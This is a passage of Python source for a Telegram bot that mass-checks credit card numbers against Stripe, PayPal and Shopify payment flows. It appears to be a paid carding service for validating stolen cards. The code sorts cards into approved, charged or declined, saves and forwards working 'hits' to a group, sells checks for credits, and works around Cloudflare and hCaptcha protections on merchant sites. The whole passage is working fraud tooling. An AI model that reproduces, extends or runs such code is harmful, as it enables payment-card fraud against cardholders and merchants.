                update_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
                
                for r in all_results[-5:]:  # Show last 5 results
                    update_msg += f"• **CC**: `{r['card']}`\n"
                    update_msg += f"• **Status**: {r['status']}\n"
                    update_msg += f"• **Result**: {r['response'][:50]}\n"
                    update_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
                
                await sent_msg.edit(update_msg, link_preview=False)
            except:
                pass
            
            # Delay between checks
            await asyncio.sleep(2)
        
        # Final message
        end_total_time = time.time()
        total_elapsed = round(end_total_time - start_total_time, 2)
        
        final_msg = f"```\n✦ [$mpp] [ #PayPal_Mass ]\n```"
        if event.sender_id in ADMIN_ID:
            final_msg += f"**$mpp limit {len(cards)}/50** - Checked: {len(all_results)}/{len(cards)}\n"
        else:
            final_msg += f"**$mpp limit {len(cards)}/15** - Checked: {len(all_results)}/{len(cards)}\n"
        final_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
        
        for r in all_results:
            final_msg += f"• **CC**: `{r['card']}`\n"
            final_msg += f"• **Status**: {r['status']}\n"
            final_msg += f"• **Result**: {r['response']}\n"
            final_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
        
        final_msg += f"**[⚬] T/t** : {total_elapsed}s\n"
        final_msg += f"**[⚬] Checked By** : {user_link} [{access_label}]\n"
        final_msg += f"**[⚬] Dev** : [𝘼𝙆](https://t.me/Akbhai007)"
        
        try:
            await sent_msg.edit(final_msg, parse_mode='Markdown', link_preview=False)
        except:
            # Message too long, send as file
            await sent_msg.edit(f"✅ Check complete! {len(all_results)} cards checked in {total_elapsed}s", link_preview=False)
            
            result_file = f"mpp_results_{event.sender_id}.txt"
            with open(result_file, 'w') as f:
                f.write(f"PayPal Mass Check Results\n")
                f.write(f"Total: {len(all_results)} cards | Time: {total_elapsed}s\n\n")
                for r in all_results:
                    f.write(f"{r['status']} {r['card']}\n")
                    f.write(f"Response: {r['response']}\n\n")
            
            await event.reply(file=result_file)
            os.remove(result_file)
    
    finally:
        # Remove from active processes
        if user_id in ACTIVE_MPP_PROCESSES:
            del ACTIVE_MPP_PROCESSES[user_id]

async def process_st_card(event, access_type):
    card = None
    
    # Extract card from reply or command
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text:
            card = extract_card(replied_msg.text)
        if not card:
            return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /st 4111111111111111|12|2025|123", link_preview=False)
    else:
        card = extract_card(event.raw_text)
        if not card:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩 ➜ /st 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙘𝙧𝙚𝙙𝙞𝙩 𝙘𝙖𝙧𝙙 𝙞𝙣𝙛𝙤", parse_mode="markdown", link_preview=False)
    
    # Show loading animation like /sh
    start_time = time.time()
    loading_msg = None
    
    async def animate_loading():
        nonlocal loading_msg
        loading_states = ["■", "■■", "■■■", "■■■■"]
        i = 0
        while True:
            try:
                current_msg = f"""- **CC**: `{card}`
- **Gateway** → Stripe Auth
- **Response**: {loading_states[i % 4]}"""
                if loading_msg is None:
                    loading_msg = await event.reply(current_msg, parse_mode="Markdown", link_preview=False)
                else:
                    await loading_msg.edit(current_msg, parse_mode="Markdown")
                await asyncio.sleep(0.4)
                i += 1
            except asyncio.CancelledError:
                break
            except Exception as e:
                with open("debug.log", "a") as f:
                    f.write(f"[ST ANIMATION ERROR] {e}\n")
                break
    
    loading_task = asyncio.create_task(animate_loading())
    
    try:
        # Check card using OnyxEnv Stripe Auth API
        res = await check_stripe_onyxenv(card)
        
        # Cancel animation and ensure loading_msg exists
        loading_task.cancel()
        await asyncio.sleep(0.3)
        
        if loading_msg is None:
            loading_msg = await event.reply("Processing...", link_preview=False)
        
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        
        # Get BIN info
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        
        # Handle response
        if not res or not isinstance(res, dict):
            res = {"Response": "API Error - Invalid response", "Gateway": "Stripe Auth", "Status": "error"}
        
        response_text = res.get("Response", "").lower()
        api_status = res.get("Status", "").lower()
        gateway = res.get("Gateway", "Stripe Auth")
        
        # Determine status - OnyxEnv API format
        
        # Check for rate limit first
        if api_status == "rate_limited":
            status_header = "⏳ 𝙍𝘼𝙏𝙀 𝙇𝙄𝙈𝙄𝙏𝙀𝘿"
            status_display = "⏳ RATE LIMITED"
        
        # Check API status field (primary indicator)
        elif api_status == "approved":
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_display = "APPROVED ✅"
            await save_approved_card(card, "APPROVED", res.get('Response'), gateway, "-")
        
        elif api_status == "declined":
            status_header = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
            status_display = "DECLINED ❌"
        
        elif api_status == "error":
            status_header = "𝘼𝙋𝙄 𝙀𝙍𝙍𝙊𝙍 ⚠️"
            status_display = "API ERROR ⚠️"
        
        # Check response text for additional details
        elif "card added" in response_text or "approved" in response_text:
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_display = "APPROVED ✅"
            await save_approved_card(card, "APPROVED", res.get('Response'), gateway, "-")
        
        elif any(key in response_text for key in ["cvv", "cvc", "security code", "incorrect_cvc", "incorrect cvc"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_display = "APPROVED ✅ (CVV)"
            await save_approved_card(card, "APPROVED", res.get('Response'), gateway, "-")
        
        elif any(key in response_text for key in ["insufficient", "funds"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_display = "APPROVED ✅ (Low Balance)"
            await save_approved_card(card, "APPROVED", res.get('Response'), gateway, "-")
        
        elif "3ds" in response_text or "authentication" in response_text:
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_display = "APPROVED ✅ (3DS)"
            await save_approved_card(card, "APPROVED", res.get('Response'), gateway, "-")
        
        elif "declined" in response_text or "invalid" in response_text:
            status_header = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
            status_display = "DECLINED ❌"
        
        else:
            # Default based on common keywords
            if any(key in response_text for key in ["success", "thank you", "payment"]):
                status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
                status_display = "APPROVED ✅"
                await save_approved_card(card, "APPROVED", res.get('Response'), gateway, "-")
            else:
                status_header = "𝘿𝙀𝘾𝙇𝙄𝙉𝙀𝘿 ❌"
                status_display = "DECLINED ❌"
        
        # Format message like /sh
        response_text_display = res.get('Response', 'No response') or 'No response'
        gateway_display = res.get('Gateway', 'Stripe Auth') or 'Stripe Auth'
        
        msg = f"""```
✦ [/st] [ #Stripe_Auth ]
```**CC**: `{card}`
**Status**: {status_display}
**Response**: {response_text_display}
**Gateway** → {gateway_display}

𝗕𝗜𝗡 𝗜𝗻𝗳𝗼: {brand} - {bin_type} - {level}
𝗕𝗮𝗻𝗸: {bank}
𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country.upper()} {flag}

Elapsed time: {elapsed_time} seconds"""
        
        try:
            result_msg = await loading_msg.edit(msg, parse_mode='Markdown', link_preview=False)
        except Exception as e:
            # Fallback without markdown if formatting fails
            result_msg = await loading_msg.edit(msg.replace('`', '').replace('*', ''))
        
        # Pin if charged
        if "charged" in status_display.lower() or "💎" in status_display:
            await pin_charged_message(event, result_msg)
            
    except Exception as e:
        loading_task.cancel()
        if loading_msg:
            await loading_msg.delete()
        await event.reply(f"❌ Error: {e}", link_preview=False)

# ===== MASS STRIPE CHECK COMMAND =====

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mst(\s|$)'))
@require_membership
async def mst(event):
    """Mass Stripe card check using OnyxEnv API"""
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("mst"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    print(f"[MSH] can_access={can_access}, access_type={access_type}")
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        print(f"[MSH] ❌ Access denied! can_access={can_access}")
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    print(f"[MSH] ✅ Access granted! Proceeding with command...")
    
    # Check if user already has an active /mst process
    if event.sender_id in ACTIVE_MSH_PROCESSES:
        return await event.reply("⏳ Wait! Your previous /mst is still checking...", link_preview=False)
    
    cards = []
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: cards = extract_all_cards(replied_msg.text)
        if not cards: return await event.reply("𝘾𝙤𝙪𝙡𝙙𝙣'𝙩 𝙚𝙭𝙩𝙧𝙖𝙘𝙩 𝙫𝙖𝙡𝙞𝙙 𝙘𝙖𝙧𝙙𝙨 𝙛𝙧𝙤𝙢 𝙧𝙚𝙥𝙡𝙞𝙚𝙙 𝙢𝙚𝙨𝙨𝙖𝙜𝙚\n\n𝙁𝙤𝙧𝙢𝙚𝙩: /𝙢𝙨𝙩 4111111111111111|12|2025|123 4111111111111111|12|2025|123", link_preview=False)
    else:
        cards = extract_all_cards(event.raw_text)
    if not cards: return await event.reply("𝙁𝙤𝙧𝙢𝙚𝙩: /𝙢𝙨𝙩 4111111111111111|12|2025|123 4111111111111111|12|2025|123 4111111111111111|12|2025|123\n\n𝙊𝙧 𝙧𝙚𝙥𝙡𝙮 𝙩𝙤 𝙖 𝙢𝙚𝙨𝙨𝙖𝙜𝙚 𝙘𝙤𝙣𝙩𝙖𝙞𝙣𝙞𝙣𝙜 𝙢𝙪𝙡𝙩𝙞𝙥𝙡𝙚 𝙘𝙖𝙧𝙙𝙨", link_preview=False)
    
    # Check mass checking limit for non-admin users
    if event.sender_id not in ADMIN_ID:
        if len(cards) > 15:
            return await event.reply("⚠️ Mass checking limit: 15 cards", link_preview=False)
    
    # Set limits based on user type and access level
    max_cards = get_cc_limit(access_type, event.sender_id)
    if event.sender_id in ADMIN_ID:
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙩 (Admin)"
    elif access_type in ["premium_private", "premium_group"]:
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙩 (Premium)"
    elif access_type == "group_free":
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙩 (Group Free)"
    else:
        limit_msg = f"{max_cards} cards for /𝙢𝙨𝙩"
    
    if len(cards) > max_cards:
        cards = cards[:max_cards]
        total_found = len(extract_all_cards(event.raw_text if not event.reply_to_msg_id else replied_msg.text))
        await event.reply(f"``` ⚠️ 𝙊𝙣𝙡𝙮 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙛𝙞𝙧𝙨𝙩 {max_cards} 𝙘𝙖𝙧𝙙𝙨 𝙤𝙪𝙩 𝙤𝙛 {total_found} 𝙥𝙧𝙤𝙫𝙞𝙙𝙚𝙙. 𝙇𝙞𝙢𝙞𝙩 𝙞𝙨 {limit_msg}.```", link_preview=False)
    
    asyncio.create_task(process_mst_cards(event, cards, access_type))

async def process_mst_cards(event, cards, access_type):
    user_id = event.sender_id
    
    # Mark process as active
    ACTIVE_MSH_PROCESSES[user_id] = True
    
    try:
        start_total_time = time.time()
        all_results = []
        
        # Get user info for header
        try:
            user = await client.get_entity(event.sender_id)
            username = user.first_name if user.first_name else "User"
            user_username = user.username if user.username else None
            if user_username:
                user_link = f"[{username}](https://t.me/{user_username})"
            else:
                user_link = username
        except:
            username = "User"
            user_link = username
        
        # Get user plan for label
        user_data = await get_user_credits(event.sender_id)
        plan = user_data.get('plan', 'Free')
        if plan == "VIP":
            access_label = "VIP 💎"
        elif plan == "VIP":
            access_label = "VIP 💎"
        else:
            access_label = "Free 🆓"
        
        # Get max cards for display
        max_cards = get_cc_limit(access_type, user_id)
        
        # Create initial message
        initial_msg = f"```\n✦ [$mst] [ #Stripe_Mass ]\n```"
        if event.sender_id in ADMIN_ID:
            initial_msg += f"**$mst limit {len(cards)}/50** - Checked: 0/{len(cards)}\n"
        else:
            initial_msg += f"**$mst limit {len(cards)}/15** - Checked: 0/{len(cards)}\n"
        initial_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
        initial_msg += "Processing cards...\n"
        
        sent_msg = await event.reply(initial_msg, link_preview=False)
        
        # Process cards one by one
        completed_count = 0
        
        for card in cards:
            if user_id not in ACTIVE_MSH_PROCESSES:
                break
            
            try:
                # Check card
                result = await check_stripe_onyxenv(card, user_id)
            except Exception as e:
                result = {"Response": f"Exception: {str(e)}", "Gateway": "Stripe Auth", "Status": "error"}
            
            if isinstance(result, Exception):
                result = {"Response": f"Exception: {str(result)}", "Gateway": "Stripe Auth", "Status": "error"}
            
            response_text = result.get("Response", "").lower()
            api_status = result.get("Status", "").lower()
            gateway = result.get("Gateway", "Stripe Auth")
            
            # Determine status
            if api_status == "approved":
                status_display = "APPROVED ✅"
                await save_approved_card(card, "APPROVED", result.get('Response'), gateway, "-")
            elif api_status == "declined":
                status_display = "Declined ❌"
            elif api_status == "error":
                status_display = "API ERROR ⚠️"
            elif "card added" in response_text or "approved" in response_text:
                status_display = "APPROVED ✅"
                await save_approved_card(card, "APPROVED", result.get('Response'), gateway, "-")
            elif any(key in response_text for key in ["cvv", "cvc", "security code", "incorrect"]):
                status_display = "APPROVED ✅"
                await save_approved_card(card, "APPROVED", result.get('Response'), gateway, "-")
            elif any(key in response_text for key in ["insufficient", "funds"]):
                status_display = "APPROVED ✅"
                await save_approved_card(card, "APPROVED", result.get('Response'), gateway, "-")
            elif "3ds" in response_text or "authentication" in response_text:
                status_display = "Declined ❌"
            else:
                status_display = "Declined ❌"
            
            # Store result
            all_results.append({
                'card': card,
                'status': status_display,
                'response': result.get('Response', 'No response')
            })
            
            completed_count += 1
            
            # Build message with all results so far
            current_msg = f"```\n✦ [$mst] [ #Stripe_Mass ]\n```"
            if event.sender_id in ADMIN_ID:
                current_msg += f"**$mst limit {len(cards)}/50** - Checked: {completed_count}/{len(cards)}\n"
            else:
                current_msg += f"**$mst limit {len(cards)}/15** - Checked: {completed_count}/{len(cards)}\n"
            current_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
            
            for r in all_results:
                current_msg += f"• **CC**: `{r['card']}`\n"
                current_msg += f"• **Status**: {r['status']}\n"
                current_msg += f"• **Result**: {r['response']}\n"
                current_msg += f"━ ━ ━ ━ ━ ━━━ ━ ━ ━ ━ ━\n"
            
            # Add footer if all complete
            if completed_count == len(cards):
                total_elapsed = round(time.time() - start_total_time, 2)
                current_msg += f"**[⚬] T/t** : {total_elapsed}s\n"
                current_msg += f"**[⚬] Checked By** : {user_link} [{access_label}]\n"
                current_msg += f"**[⚬] Dev** : [𝘼𝙆](https://t.me/Akbhai007)"
            
            # Edit message
            try:
                if sent_msg:
                    await sent_msg.edit(current_msg, parse_mode='Markdown', link_preview=False)
            except:
                pass
            
            # Delay to avoid Stripe API rate limits (increased for better success rate)
            if completed_count < len(cards):
                await asyncio.sleep(2.0)  # 2 second delay between cards
        
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙞𝙣 𝙢𝙖𝙨𝙨 𝙘𝙝𝙚𝙘𝙠: {e}", link_preview=False)
    finally:
        # Remove from active processes
        if user_id in ACTIVE_MSH_PROCESSES:
            del ACTIVE_MSH_PROCESSES[user_id]

# ===== MASS STRIPE TEXT FILE CHECK COMMAND =====

@client.on(events.NewMessage(pattern=r'(?i)^[/.]mstxt$'))
@require_membership
async def mstxt(event):
    """Mass Stripe card check from text file using OnyxEnv API"""
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("mstxt"):
        return await event.reply("⚠️ This command is currently disabled by admin.", link_preview=False)
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    print(f"[MSH] can_access={can_access}, access_type={access_type}")
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    if not can_access:
        print(f"[MSH] ❌ Access denied! can_access={can_access}")
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    print(f"[MSH] ✅ Access granted! Proceeding with command...")
    
    user_id = event.sender_id
    if user_id in ACTIVE_MTXT_PROCESSES: 
        return await event.reply("```𝙔𝙤𝙪𝙧 𝙘𝙖𝙧𝙙 𝙞𝙨 𝙘𝙤𝙤𝙠𝙞𝙣𝙜! 𝙋𝙡𝙚𝙖𝙨𝙚 𝙝𝙤𝙡𝙙 𝙤𝙣...```", link_preview=False)
    
    try:
        if not event.reply_to_msg_id: 
            return await event.reply("❌ Please reply to a document message with /mstxt", link_preview=False)
        
        replied_msg = await event.get_reply_message()
        if not replied_msg or not replied_msg.document: 
            return await event.reply("❌ Please reply to a document message with /mstxt", link_preview=False)
        
        file_path = await replied_msg.download_media()
        try:
            async with aiofiles.open(file_path, "r") as f: 
                lines = (await f.read()).splitlines()
            os.remove(file_path)
        except Exception as e:
            try: os.remove(file_path)
            except: pass
            return await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙧𝙚𝙖𝙙𝙞𝙣𝙜 𝙛𝙞𝙡𝙚: {e}", link_preview=False)
        
        cards = [line for line in lines if re.match(r'\d{12,16}\|\d{1,2}\|\d{2,4}\|\d{3,4}', line)]
        if not cards: 
            return await event.reply("𝘼𝙣𝙮 𝙑𝙖𝙡𝙞𝙙 𝘾𝘾 𝙣𝙤𝙩 𝙁𝙤𝙪𝙣𝙙 🥲", link_preview=False)
        
        cc_limit = get_mtxt_cc_limit(access_type, user_id)
        total_cards_found = len(cards)
        
        if len(cards) > cc_limit:
            cards = cards[:cc_limit]
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
⚠️ 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 ??𝙞𝙧𝙨𝙩 {cc_limit} 𝘾𝘾𝙨 (𝙮𝙤𝙪𝙧 𝙡𝙞𝙢𝙞𝙩)
🔥 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙 ✅```""", link_preview=False)
        else: 
            await event.reply(f"""```📝 𝙁𝙤𝙪𝙣𝙙 {total_cards_found} 𝙫𝙖𝙡𝙞𝙙 𝘾𝘾𝙨 𝙞𝙣 𝙛𝙞𝙡𝙚
🔥 𝘼𝙡𝙡 {len(cards)} 𝘾𝘾𝙨 𝙬𝙞𝙡𝙡 𝙗𝙚 𝙘𝙝𝙚𝙘𝙠𝙚𝙙 ✅```""", link_preview=False)
        
        ACTIVE_MTXT_PROCESSES[user_id] = True
        asyncio.create_task(process_mstxt_cards(event, cards, access_type))
        
    except Exception as e:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)
        await event.reply(f"❌ Error: {e}", link_preview=False)

async def process_mstxt_cards(event, cards, access_type):
    """Process mass stripe text file card checking"""
    user_id = event.sender_id
    total = len(cards)
    checked, approved, charged, declined = 0, 0, 0, 0
    
    status_msg = await event.reply(f"```𝙎𝙩𝙧𝙞𝙥𝙚 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🔐```", link_preview=False)
    
    try:
        # Get user info for header
        try:
            user = await client.get_entity(event.sender_id)
            username = user.first_name if user.first_name else "User"
            user_username = user.username if user.username else None
            if user_username:
                user_link = f"[{username}](https://t.me/{user_username})"
            else:
                user_link = username
        except:
            username = "User"
            user_link = username
        
        # Get user plan for label
        user_data = await get_user_credits(event.sender_id)
        plan = user_data.get('plan', 'Free')
        if plan == "VIP":
            access_label = "VIP 💎"
        elif plan == "VIP":
            access_label = "VIP 💎"
        else:
            access_label = "Free 🆓"
        
        start_time = time.time()
        
        # Process cards one by one
        for card in cards:
            if user_id not in ACTIVE_MTXT_PROCESSES:
                break
            
            try:
                # Check card
                result = await check_stripe_onyxenv(card, user_id)
            except Exception as e:
                result = {"Response": f"Exception: {str(e)}", "Gateway": "Stripe Auth", "Status": "error"}
            
            if isinstance(result, Exception):
                result = {"Response": f"Exception: {str(result)}", "Gateway": "Stripe Auth", "Status": "error"}
            
            # Get BIN info
            brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
            
            response_text = result.get("Response", "").lower()
            api_status = result.get("Status", "").lower()
            gateway = result.get("Gateway", "Stripe Auth")
            
            # Determine status
            if api_status == "approved" or any(key in response_text for key in ["cvv", "cvc", "insufficient", "3ds", "authentication", "card added", "approved"]):
                status_display = "APPROVED ✅"
                approved += 1
                await save_approved_card(card, "APPROVED", result.get('Response'), gateway, "-")
            else:
                status_display = "DECLINED ❌"
                declined += 1
            
            checked += 1
            
            # Update status message with buttons
            try:
                buttons = [
                    [Button.inline(f"𝗖𝘂𝗿𝗿𝗲𝗻𝘁 ➜ {card[:12]}****", b"none")],
                    [Button.inline(f"𝙎𝙩𝙖𝙩𝙪𝙨 ➜ {result.get('Response')[:25]}...", b"none")],
                    [Button.inline(f"𝘼𝙥𝙥𝙧𝙤𝙫𝙚 ➜ [ {approved} ] 🔥", b"none")],
                    [Button.inline(f"𝘿𝙚𝙘𝙡𝙞𝙣𝙚 ➜ [ {declined} ] ❌", b"none")],
                    [Button.inline(f"𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ➜ [{checked}/{total}] ✅", b"none")],
                    [Button.inline("⛔ 𝙎𝙩𝙤𝙥", f"stop_mtxt:{user_id}".encode())]
                ]
                await status_msg.edit(f"```𝙎𝙩𝙧𝙞𝙥𝙚 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 🔐```", buttons=buttons)
            except:
                pass
        
        # Update status message to show complete (remove buttons)
        try:
            await status_msg.edit(f"```𝙎𝙩𝙧𝙞𝙥𝙚 𝙈𝙖𝙨𝙨 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚 ✅```")
        except:
            pass
        
        # Send summary message
        end_time = time.time()
        total_elapsed = round(end_time - start_time, 2)
        
        summary_msg = f"""```
✦ [$mstxt] [ #Stripe_Mass_Complete ]
```
**Total Cards**: {total}
**Approved**: {approved} ✅
**Declined**: {declined} ❌
**Total Time**: {total_elapsed} seconds
**Checked By**: {user_link} {access_label}

All cards processed! ✅"""
        
        await event.reply(summary_msg, parse_mode='Markdown', link_preview=False)
        
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧 𝙞𝙣 𝙢𝙖𝙨𝙨 𝙘𝙝𝙚𝙘𝙠: {e}", link_preview=False)
    finally:
        ACTIVE_MTXT_PROCESSES.pop(user_id, None)

@client.on(events.NewMessage(pattern=r'(?i)^[/.]sh(\s|$)'))
@require_membership
async def sh(event):
    # Debug: Log where command is being called from
    with open("debug.log", "a") as f:
        f.write(f"[SH COMMAND] User {event.sender_id} called /sh from chat_id: {event.chat_id}\n")
        f.write(f"[SH COMMAND] Is group chat: {event.chat_id < 0}\n")
        f.write(f"[SH COMMAND] GROUP_ID value: {GROUP_ID}\n")
        f.write(f"[SH COMMAND] Is main group: {event.chat_id == GROUP_ID}\n")
    
    # Check group authorization FIRST
    if not await check_group_authorization(event):
        return
    
    # Check if command is enabled
    if not is_command_enabled("sh"):
        return
    
    can_access, access_type = await can_use(event.sender_id, event.chat)
    if access_type == "banned": return await event.reply(banned_user_message(), link_preview=False)
    
    # Main group me free check - no credit check needed
    if event.chat_id == GROUP_ID:
        with open("debug.log", "a") as f:
            f.write(f"[SH COMMAND] Main group detected - skipping all credit checks\n")
        asyncio.create_task(process_sh_card(event, access_type))
        return
    
    # Other groups/private chat - check credits
    if not can_access:
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    # Normalize chat_id for credit check
    check_chat_id = event.chat.id
    if check_chat_id > 0:
        check_chat_id = int(f"-100{check_chat_id}")
    
    if not await check_credits_and_notify(event.sender_id, 1, check_chat_id):
        buttons = [[Button.url("🚀 Join Group", "https://t.me/+zsDNOaFO-_tlZjA1")]]
        return await event.reply("❌ Insufficient Credits!\n\n(Free check available in group)", buttons=buttons, link_preview=False)
    
    asyncio.create_task(process_sh_card(event, access_type))

async def process_sh_card(event, access_type):
    card = None
    if event.reply_to_msg_id:
        replied_msg = await event.get_reply_message()
        if replied_msg and replied_msg.text: card = extract_card(replied_msg.text)
        if not card: return await event.reply("Couldn't extract valid card info from replied message\n\nFormat ➜ /sh 4111111111111111|12|2025|123", link_preview=False)
    else:
        card = extract_card(event.raw_text)
        if not card: return await event.reply("Format ➜ /sh 4111111111111111|12|2025|123\n\nOr reply to a message containing credit card info", parse_mode="markdown", link_preview=False)
    
    # Deduct 1 credit
    success, remaining = await deduct_user_credits(event.sender_id, 1, "/sh", event.chat_id)
    if not success:
        return await event.reply("❌ **Credit deduction failed!**\n\n💡 Use /balance to check your credits", link_preview=False)
    
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(event.sender_id), [])
    if not user_sites: return await event.reply("You haven't added any URLs. First add using /add", link_preview=False)
    
    # Initial display message with loading animation
    loading_msg = None
    start_time = time.time()
    
    async def animate_loading():
        nonlocal loading_msg
        loading_states = ["■", "■■", "■■■", "■■■■"]
        i = 0
        while True:
            try:
                current_msg = f"""- **CC**: `{card}`
- **Gateway** → Shopify charge $
- **Response**: {loading_states[i % 4]}"""
                if loading_msg is None:
                    loading_msg = await event.reply(current_msg, parse_mode="Markdown", link_preview=False)
                else:
                    await loading_msg.edit(current_msg, parse_mode="Markdown")
                await asyncio.sleep(0.4)
                i += 1
            except: break
    
    loading_task = asyncio.create_task(animate_loading())
    try:
        res, site_index = await check_card_random_site(card, user_sites, event.sender_id)
        loading_task.cancel()
        try:
            await loading_task
        except asyncio.CancelledError:
            pass
        end_time = time.time()
        elapsed_time = round(end_time - start_time, 2)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split("|")[0])
        
        # Check if res is None or invalid
        if not res or not isinstance(res, dict):
            res = {"Response": "API Error - Invalid response", "Price": "-", "Gateway": "-"}
        
        response_text = res.get("Response", "").lower()
        status_header = ""  # Initialize status_header
        
        # Handle site/API errors first
        if "py id empty" in response_text or "product id is empty" in response_text:
            status_header = "𝙎𝙄𝙏𝙀 𝘿𝙀𝘼𝘿 ⚠️"
            res["Response"] = "Site Dead - Product not found. Use /check to clean sites."
        elif "tax amount is empty" in response_text:
            status_header = "𝙎𝙄𝙏𝙀 𝙀𝙍𝙍𝙊𝙍 ⚠️"
            res["Response"] = "Site Dead - Tax not configured. Try different site."
        elif "api_error_502" in response_text:
            status_header = "𝘼𝙋𝙄 𝙀𝙍𝙍𝙊𝙍 ⚠️"
            res["Response"] = "API Server Down (502) - Try /sh command or wait few minutes"
        elif "api_error_504" in response_text:
            status_header = "𝘼𝙋𝙄 𝙀𝙍𝙍𝙊𝙍 ⚠️"
            res["Response"] = "API Gateway Timeout - Try again later"
        elif "api_error" in response_text:
            status_header = "𝘼𝙋𝙄 𝙀𝙍𝙍𝙊𝙍 ⚠️"
            res["Response"] = "API Error - Server may be down. Try /sh instead"
        # Handle 3D CC responses
        elif "3d" in response_text:
            res["Response"] = "3DS Authentications Required"
        
        # Handle r4 token empty, hcaptcha, and amount errors
        if any(err in response_text for err in ["r4 token empty", "r4 token is empty", "hcaptcha detected", "hcaptcha", "del ammount empty", "del amount empty"]):
            res["Response"] = "INCORRECT_NUMBER"
            response_text = "incorrect_number"  # Update response_text so it matches approved condition
        
        if "cloudflare bypass failed" in response_text:
            status_header = "𝘾𝙇𝙊𝙐𝘿𝙁𝙇𝘼𝙍𝙀 𝙎𝙋𝙊𝙏𝙏𝙀𝘿 ⚠️"
            res["Response"] = "Cloudflare spotted 🤡 change site or try again"
        elif "thank you" in response_text or "payment successful" in response_text:
            status_header = "𝘾𝙃𝘼𝙍𝙂𝙀𝘿 💎"
            status_result = "Charged"
            await save_approved_card(card, status_result, res.get('Response'), res.get('Gateway'), res.get('Price'))
            # Forward to Hits Group (Thank you responses)
            await forward_to_hits_group(card, res.get('Response'), res.get('Gateway'), res.get('Price'), site_index, event.sender_id, "sh")
        elif any(key in response_text for key in ["invalid_cvv", "incorrect_cvv", "insufficient_funds", "approved", "success", "invalid_cvc", "incorrect_cvc", "incorrect_zip", "insufficient funds"]):
            status_header = "𝘼𝙋𝙋𝙍𝙊𝙑𝙀𝘿 ✅"
            status_result = "Approved"
